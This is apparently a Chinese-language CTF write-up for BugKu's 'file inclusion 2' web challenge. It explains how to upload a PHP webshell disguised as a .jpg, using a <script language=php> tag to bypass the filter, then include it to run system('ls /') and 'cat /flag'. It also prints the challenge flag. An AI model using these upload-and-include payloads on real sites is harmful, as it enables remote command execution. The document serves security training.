# BugKu Web13 - 文件包含2



## 题目信息

- **平台**: [BugKu CTF](https://ctf.bugku.com/)

- **类型**: Web

- **难度**: ⭐⭐⭐

- **金币**: 4

- **分数**: 35



## 题目描述

打开题目后，页面上只有一个超链接 "click me? no"，点击后页面显示一段提示文字，URL 中出现了 `file=show.php` 的传参。与第12题相比，本题过滤更加严格，伪协议被过滤，需要配合文件上传进行利用。



## 解题过程



### 1. 打开题目

访问链接，看到页面上只有一个超链接。



### 2. 查看源码

按 `F12` 打开开发者工具查看源码，发现注释中隐藏了一个文件上传入口：

```html
<!-- upload.php -->
```



### 3. 访问上传页面

访问 `upload.php`，来到文件上传页面，页面提示只能上传 jpg/gif/png 格式，文件大小不能超过 100KiB。



### 4. 构造命令执行图片马

由于蚁剑等工具无法直接连接，换一种思路：利用文件包含执行系统命令，读取 flag 文件。

构造如下 payload，保存为图片格式上传：

```php
<script language=php>system("ls /")</script>
```

将文件后缀修改为 `.jpg` 后上传,页面返回:

```
file upload successful!Save in: upload/202606151207474001.jpg
```


### 5. 文件包含执行命令

上传成功后，通过文件包含漏洞包含上传的图片马文件：

```
index.php?file=upload/202606151207474001.jpg
```

页面输出根目录文件列表，发现存在一个名为 `flag` 的文件。



### 6. 读取 flag 文件

再次构造 payload 读取 flag 文件内容：

```php
<script language=php>system("cat /flag")</script>
```

上传后再次包含执行，得到 flag。



### 7. 获取 Flag

```
flag{f781c189a67fc66d34c8f98fd25c7e1b}
```



## 知识点总结

- **文件包含漏洞（LFI）+ 文件上传组合拳**: 当伪协议被过滤时，可以通过上传包含恶意代码的文件，再利用文件包含执行该文件，实现命令执行。

- **图片马构造**: 将 PHP 代码嵌入图片文件中，或直接使用 `<script language=php>` 标签包裹 PHP 代码(老旧 PHP 环境支持 script language="php" 作为 PHP 执行标签，等价于标准 `<?php ?>`,修改后缀为 `.jpg` 绕过文件类型限制。

- **命令执行获取 flag**: 利用 `system()` 函数执行系统命令，先通过 `ls /` 查看根目录发现 flag 文件，再通过 `cat /flag` 读取内容。

- **过滤绕过技巧**: 使用 `<script language=php>` 替代 `<?php ?>` 绕过常见的 PHP 标签过滤。


## 参考

- [BugKu CTF 平台](https://ctf.bugku.com/)
